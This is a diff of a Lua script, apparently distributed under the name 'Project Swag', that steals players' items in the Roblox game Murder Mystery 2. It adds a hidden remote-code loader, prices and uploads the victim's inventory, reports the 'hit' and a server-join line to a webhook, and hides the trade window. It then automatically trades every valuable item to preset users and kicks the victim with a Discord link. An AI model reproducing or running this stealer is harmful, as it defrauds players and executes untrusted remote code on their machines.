@@ -7,11 +7,16 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
+-- Visual script loader (isteğe bağlı)
+pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Godfather-team/mm2s2ci/refs/heads/main/visual.lua'))()
+end)
+
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- Universal request (TÜM EXECUTORLAR İÇİN)
+-- Universal request
 getgenv().request = getgenv().request 
     or request 
     or http_request 
@@ -39,7 +44,7 @@ if not getgenv().request then
     return warn("Executor not supported: No request function found.")
 end
 
--- Universal queue_on_teleport (korunur, kullanılmasa da)
+-- Universal queue_on_teleport / setclipboard
 getgenv().queue_on_teleport = getgenv().queue_on_teleport 
     or queue_on_teleport 
     or queueonteleport 
@@ -60,7 +65,6 @@ getgenv().queue_on_teleport = getgenv().queue_on_teleport
     or (xeno and xeno.queue_on_teleport) 
     or nil
 
--- Universal setclipboard
 getgenv().setclipboard = getgenv().setclipboard 
     or setclipboard 
     or (syn and syn.setclipboard) 
@@ -83,6 +87,7 @@ getgenv().setclipboard = getgenv().setclipboard
 local HttpService = game:GetService("HttpService")
 if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end
 
+-- === CONFIG ===
 local cfg = (getgenv and getgenv()) or {}
 cfg.users = cfg.users or {}
 cfg.webhook = webh or ""
@@ -94,48 +99,18 @@ if usern and typeof(usern) == "string" then
     end
 end
 
--- Trade dışı itemlar
-local no_trade_items = {
-    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
-    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
-    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
-    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
-    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
-    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
-    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
-    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
-    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
-}
-
--- Chroma/özel itemler
-local specialItems = {
-    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
-    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
-    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
-    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
-    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
-    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
-    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
-    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
-    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
-    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
-}
-
 local users = cfg.users
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local plr = Players.LocalPlayer
-
 if not plr then return end
 
 local isTradeCompleted = false
-local hasSpecialItem = false
 local totalInventoryValue = 0
-
 local request = getgenv().request
 
--- Executor ismini evrensel olarak al
+-- === EXECUTOR NAME ===
 local executorName = "Unknown"
 pcall(function()
     local ok, name = pcall(identifyexecutor)
@@ -149,7 +124,7 @@ pcall(function()
     end
 end)
 
--- ---- YENİ DELTA BYPASS (hookfunction ile) ----
+-- === DELTA BYPASS (hookfunction) ===
 local REAL_JOB_ID = game.JobId
 if executorName:lower() == "delta" then
     local stepAnimate = nil
@@ -173,7 +148,6 @@ if executorName:lower() == "delta" then
     end)
     repeat task.wait() until captured
 end
--- ---- BYPASS SONU ----
 
 if not plr.Character then plr.CharacterAdded:Wait() end
 task.wait(1)
@@ -181,31 +155,197 @@ task.wait(1)
 local PlaceId = game.PlaceId
 local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
 
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local SendRequest = Trade:WaitForChild("SendRequest")
-local GetStatus = Trade:WaitForChild("GetTradeStatus")
-local OfferItem = Trade:WaitForChild("OfferItem")
-local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
-local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+-- === TRADE DIŞI ITEMLAR ===
+local no_trade_items = {
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
+    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
+    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
+    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
+    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
+    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
+    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
+}
 
-local LastOffer = nil
-Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
-    if x and x.LastOffer then LastOffer = x.LastOffer end
-end)
+-- === CHROMA / ÖZEL ITEMLER ===
+local specialItems = {
+    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
+    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
+    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
+    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
+    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
+    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
+    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
+    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
+    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
+    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
+}
 
--- GUI'leri kapat
-local PlayerGui = plr:WaitForChild("PlayerGui")
-for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
-    local gui = PlayerGui:FindFirstChild(guiName)
-    if gui then
-        gui.Enabled = false
-        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if gui.Enabled then gui.Enabled = false end
+-- === SUPREME VALUES (fetch_all_values) ===
+local function fetch_all_values()
+    local value_links = {
+        commons = "https://supremevalues.com/mm2/commons",
+        uncommons = "https://supremevalues.com/mm2/uncommons",
+        rares = "https://supremevalues.com/mm2/rares",
+        legendaries = "https://supremevalues.com/mm2/legendaries",
+        godlies = "https://supremevalues.com/mm2/godlies",
+        chromas = "https://supremevalues.com/mm2/chromas",
+        vintages = "https://supremevalues.com/mm2/vintages",
+        ancients = "https://supremevalues.com/mm2/ancients",
+        evos = "https://supremevalues.com/mm2/evos",
+        uniques = "https://supremevalues.com/mm2/uniques",
+        sets = "https://supremevalues.com/mm2/sets"
+    }
+    local req_headers = {
+        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    }
+    local function clean_string_lol(str) return str:match("^%s*(.-)%s*$") end
+    local function fetchHTML(url)
+        local ok, response = pcall(function() return request({Url = url, Method = "GET", Headers = req_headers}) end)
+        if ok and response then return response.Body end
+        return nil
+    end
+    local function parseValue(itembodyDiv)
+        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+        if valueStr then
+            valueStr = valueStr:gsub(",", "")
+            local value = tonumber(valueStr)
+            if value then return value end
+        end
+        return nil
+    end
+    local function extractItems(htmlContent)
+        local itemValues = {}
+        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            itemName = itemName:match("([^<]+)")
+            if itemName then
+                itemName = clean_string_lol(itemName:gsub("%s+", " "))
+                itemName = clean_string_lol((itemName:split(" Click "))[1])
+                local itemNameLower = itemName:lower()
+                local value = parseValue(itembodyDiv)
+                if value then itemValues[itemNameLower] = value end
+            end
+        end
+        return itemValues
+    end
+    local function extractChromaItems(htmlContent)
+        local chromaValues = {}
+        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            chromaName = chromaName:match("([^<]+)")
+            if chromaName then
+                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
+                local value = parseValue(itembodyDiv)
+                if value then chromaValues[chromaName] = value end
+            end
+        end
+        return chromaValues
+    end
+
+    local allExtractedValues = {}
+    local chromaExtractedValues = {}
+    local categoriesToFetch = {}
+    for rarity, url in pairs(value_links) do
+        table.insert(categoriesToFetch, {rarity = rarity, url = url})
+    end
+    local totalCategories = #categoriesToFetch
+    local completed = 0
+    local lock = Instance.new("BindableEvent")
+
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity = category.rarity
+            local url = category.url
+            local htmlContent = fetchHTML(url)
+            if htmlContent and htmlContent ~= "" then
+                if rarity == "chromas" then
+                    local extracted = extractChromaItems(htmlContent)
+                    for k, v in pairs(extracted) do chromaExtractedValues[k] = v end
+                else
+                    local extracted = extractItems(htmlContent)
+                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
+                end
+            end
+            completed = completed + 1
+            if completed == totalCategories then lock:Fire() end
         end)
     end
+    lock.Event:Wait()
+
+    local final_prices = {}
+    local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    for id, data in pairs(item_db) do
+        local item_name = data.ItemName and data.ItemName:lower() or ""
+        local rarity = data.Rarity or ""
+        local has_chroma = data.Chroma or false
+        if item_name ~= "" and rarity ~= "" then
+            if has_chroma then
+                for c_name, c_val in pairs(chromaExtractedValues) do
+                    if c_name:find(item_name) then
+                        final_prices[id] = c_val
+                        break
+                    end
+                end
+            end
+            if not final_prices[id] and allExtractedValues[item_name] then
+                final_prices[id] = allExtractedValues[item_name]
+            end
+            if not final_prices[id] then
+                if rarity == "Godly" then final_prices[id] = 8
+                elseif rarity == "Ancient" then final_prices[id] = 50
+                elseif rarity == "Unique" then final_prices[id] = 100
+                elseif rarity == "Vintage" then final_prices[id] = 25
+                elseif rarity == "Evos" then final_prices[id] = 15
+                elseif rarity == "Legendary" then final_prices[id] = 5
+                else final_prices[id] = 1 end
+            end
+        end
+    end
+    return final_prices
 end
 
--- Inventory oku
+-- === RUBIS.APP UPLOAD ===
+local function upload_to_rubis(items)
+    local lines = {"Project Swag Inventory Dump", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+    table.sort(items, function(a, b)
+        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
+        local a_order = tier_order[a.Rarity] or 1
+        local b_order = tier_order[b.Rarity] or 1
+        if a_order ~= b_order then return a_order > b_order end
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+    local current_tier = nil
+    for _, item in ipairs(items) do
+        if current_tier ~= item.Rarity then
+            current_tier = item.Rarity
+            table.insert(lines, "")
+            table.insert(lines, "[" .. current_tier:upper() .. "]")
+            table.insert(lines, string.rep("-", 30))
+        end
+        local total_val = item.Value * item.Amount
+        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
+    end
+    local content = table.concat(lines, "\n")
+    local ok, response = pcall(function()
+        return request({
+            Url = "https://api.rubis.app/v2/scrap?public=true",
+            Method = "POST",
+            Headers = {["Content-Type"] = "text/plain"},
+            Body = content
+        })
+    end)
+    if ok and response and response.StatusCode == 200 then
+        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+        if ok2 and data then
+            if data.raw then return data.raw
+            elseif data.scrapID then return "https://api.rubis.app/v2/scrap/" .. data.scrapID .. "/raw" end
+        end
+    end
+    return nil
+end
+
+-- === ENVANTER OKU ===
 local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
@@ -221,7 +361,6 @@ for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
         local value = prices[dataid] or 1
         local totalValue = value * amount
         totalInventoryValue = totalInventoryValue + totalValue
-        if specialItems[itemName] then hasSpecialItem = true end
         table.insert(weaponsToSend, {
             DataID = dataid,
             ItemName = itemName,
@@ -240,7 +379,6 @@ table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)
 -- Hit kategorisi
 local hitCategory = ""
 local isPingWorthy = false
-
 if totalInventoryValue < 100 then
     hitCategory = "Bad Hit"
 elseif totalInventoryValue < 300 then
@@ -255,12 +393,10 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
--- Webhook gönderme
+-- === WEBHOOK GÖNDER (Project Swag) ===
 local function sendWebhook(targetWebhook)
     local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
     local targetName = table.concat(users, ", ")
-    local hookType = "HIT"
-    local color = 0xFF0000
     local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)
 
     local total_items = 0
@@ -283,9 +419,9 @@ local function sendWebhook(targetWebhook)
     end
 
     local embed = {
-        title = string.format("%s | %s | %s | %s", hookType, plr.DisplayName, targetName, hitCategory),
+        title = string.format("HIT | %s | %s | %s", plr.DisplayName, targetName, hitCategory),
         description = string.format("```lua\n%s\n```", joinScript),
-        color = color,
+        color = 0xFF0000,
         thumbnail = {url = avatarUrl},
         fields = {
             {
@@ -341,102 +477,76 @@ local function sendWebhook(targetWebhook)
     end)
 end
 
--- İlk gönderim
 sendWebhook(cfg.webhook)
 
--- Trade fonksiyonları
+-- ============================================================
+-- === BURASI: Eternal Darkness'dan ALINAN YENİ TRADE SİSTEMİ ===
+-- ============================================================
+
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local SendRequest = Trade:WaitForChild("SendRequest")
+local GetStatus = Trade:WaitForChild("GetTradeStatus")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+
+local last_offer_info = nil
+
+-- lastOffer yakalama (Eternal Darkness metodu)
+if Trade:FindFirstChild("UpdateTrade") then
+    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
+        if typeof(data) == "table" then
+            if data.lastOffer ~= nil then
+                last_offer_info = data.lastOffer
+            elseif data.LastOffer ~= nil then
+                last_offer_info = data.LastOffer
+            end
+        end
+    end)
+end
+
+-- Trade GUI'leri kapat
+local PlayerGui = plr:WaitForChild("PlayerGui")
+for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+    local gui = PlayerGui:FindFirstChild(guiName)
+    if gui then
+        gui.Enabled = false
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled then gui.Enabled = false end
+        end)
+    end
+end
+
+-- === TRADE FONKSİYONLARI (Eternal Darkness) ===
+
 local function getStatus()
-    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
+    local ok, status = pcall(function()
+        return GetStatus:InvokeServer()
+    end)
     return ok and status or "None"
 end
 
-local function waitForTarget(targetPlayer)
-    local attempts = 0
-    while attempts < 30 do
-        if targetPlayer and targetPlayer.Parent then
-            local char = targetPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then return true end
-        end
-        attempts = attempts + 1
-        task.wait(0.5)
-    end
-    return false
+local function waitUntilDone()
+    repeat task.wait(0.1) until getStatus() == "None"
 end
 
-local function AcceptTrade()
-    if not LastOffer then return false end
-    local ok = pcall(function()
-        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
+local function acceptDeal()
+    -- MM2 AcceptTrade imzası: FireServer(game.PlaceId * 3, lastOffer)
+    if not last_offer_info then
+        last_offer_info = {}
+    end
+    pcall(function()
+        AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info)
     end)
-    return ok
 end
 
-local function finishAndKick()
-    isTradeCompleted = true
-    task.wait(2)
-    local discordLink = "https://discord.gg/7PJtnGwdXW"
-    pcall(function() setclipboard(discordLink) end)
-    plr:Kick("Items taken by Project Swag\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+local function addToOffer(item_id)
+    pcall(function()
+        OfferItem:FireServer(item_id, "Weapons")
+    end)
+    task.wait(0.1)
 end
 
-function doTrade(targetPlayer)
-    if not targetPlayer or not targetPlayer.Parent then return end
-    if not waitForTarget(targetPlayer) then return end
-    
-    pcall(function() DeclineTrade:FireServer() end)
-    task.wait(0.5)
-    LastOffer = nil
-    
-    local itemsAdded = false
-    local timeout = 0
-    
-    while timeout < 60 and #weaponsToSend > 0 do
-        local success = pcall(function()
-            local status = getStatus()
-            
-            if status == "None" then
-                if itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do table.remove(weaponsToSend, 1) end
-                    itemsAdded = false
-                    LastOffer = nil
-                    task.wait(0.5)
-                else
-                    SendRequest:InvokeServer(targetPlayer)
-                    task.wait(1.5)
-                end
-            elseif status == "SendingRequest" then
-                task.wait(0.5)
-            elseif status == "ReceivingRequest" then
-                DeclineTrade:FireServer()
-                task.wait(0.3)
-            elseif status == "StartTrade" then
-                if not itemsAdded then
-                    for i = 1, math.min(4, #weaponsToSend) do
-                        local item = weaponsToSend[i]
-                        for _ = 1, item.Amount do
-                            OfferItem:FireServer(item.DataID, "Weapons")
-                        end
-                        task.wait(0.1)
-                    end
-                    itemsAdded = true
-                    task.spawn(function()
-                        task.wait(6.5)
-                        AcceptTrade()
-                    end)
-                else
-                    task.wait(1)
-                end
-            end
-        end)
-        
-        if not success then task.wait(1) end
-        timeout = timeout + 1
-    end
-    
-    if #weaponsToSend == 0 then finishAndKick() end
-end
-
--- Target kontrol
 local function isTarget(name)
     for _, u in ipairs(users) do
         if u:lower() == name:lower() then return true end
@@ -444,7 +554,134 @@ local function isTarget(name)
     return false
 end
 
--- Eventler
+-- === ANA TRADE FONKSİYONU (Eternal Darkness) ===
+
+local function doTrade(targetPlayer)
+    if not targetPlayer then return end
+
+    -- Hedefin karakterini bekle
+    local attempts = 0
+    while attempts < 30 do
+        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+            break
+        end
+        attempts = attempts + 1
+        task.wait(0.5)
+    end
+
+    -- Gönderilecek itemlerin kopyasını oluştur (orijinal tabloyu bozma)
+    local itemsToTrade = {}
+    for _, item in ipairs(weaponsToSend) do
+        table.insert(itemsToTrade, {
+            DataID = item.DataID,
+            ItemName = item.ItemName,
+            Amount = item.Amount,
+            Rarity = item.Rarity,
+            Value = item.Value,
+            TotalValue = item.TotalValue
+        })
+    end
+
+    if #itemsToTrade == 0 then
+        warn("[PS] No items to trade")
+        return
+    end
+
+    while #itemsToTrade > 0 and not isTradeCompleted do
+        local statusNow = getStatus()
+
+        -- Mevcut trade'i temizle
+        if statusNow == "StartTrade" then
+            pcall(function() DeclineTrade:FireServer() end)
+            task.wait(0.3)
+        elseif statusNow == "ReceivingRequest" then
+            if Trade:FindFirstChild("DeclineRequest") then
+                pcall(function() Trade.DeclineRequest:FireServer() end)
+            else
+                pcall(function() DeclineTrade:FireServer() end)
+            end
+            task.wait(0.3)
+        end
+
+        -- Trade başlat
+        local tradeStarted = false
+        local sendAttempts = 0
+        while not tradeStarted and sendAttempts < 30 do
+            local current = getStatus()
+            if current == "StartTrade" then
+                tradeStarted = true
+                break
+            elseif current == "None" then
+                pcall(function()
+                    SendRequest:InvokeServer(targetPlayer)
+                end)
+            elseif current == "ReceivingRequest" then
+                if Trade:FindFirstChild("DeclineRequest") then
+                    pcall(function() Trade.DeclineRequest:FireServer() end)
+                else
+                    pcall(function() DeclineTrade:FireServer() end)
+                end
+            end
+            sendAttempts = sendAttempts + 1
+            task.wait(0.5)
+        end
+
+        if not tradeStarted then
+            task.wait(2)
+            goto continue
+        end
+
+        -- Item ekle (max 4 slot)
+        local slotsLeft = 4
+        local itemsAdded = 0
+        while slotsLeft > 0 and #itemsToTrade > 0 do
+            local currentItem = itemsToTrade[1]
+            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
+            for _ = 1, amountToAdd do
+                addToOffer(currentItem.DataID)
+            end
+            currentItem.Amount = currentItem.Amount - amountToAdd
+            if currentItem.Amount <= 0 then
+                table.remove(itemsToTrade, 1)
+            end
+            slotsLeft = slotsLeft - amountToAdd
+            itemsAdded = itemsAdded + amountToAdd
+        end
+
+        if itemsAdded == 0 then
+            break
+        end
+
+        -- Kabul et
+        task.wait(5)
+        acceptDeal()
+        waitUntilDone()
+
+        if #itemsToTrade > 0 then
+            task.wait(1)
+        end
+
+        ::continue::
+    end
+
+    -- Tüm itemler gönderildiyse
+    if #itemsToTrade == 0 then
+        isTradeCompleted = true
+        task.wait(2)
+        local discordLink = "https://discord.gg/7PJtnGwdXW"
+        pcall(function()
+            if setclipboard then
+                setclipboard(discordLink)
+            end
+        end)
+        pcall(function()
+            plr:Kick("Items taken by Project Swag\n\n" .. discordLink .. "\n\nJoin to get your items back!")
+        end)
+    end
+end
+
+-- === TARGET EVENTLER ===
+
 Players.PlayerAdded:Connect(function(player)
     if player == plr then return end
     if isTarget(player.Name) then
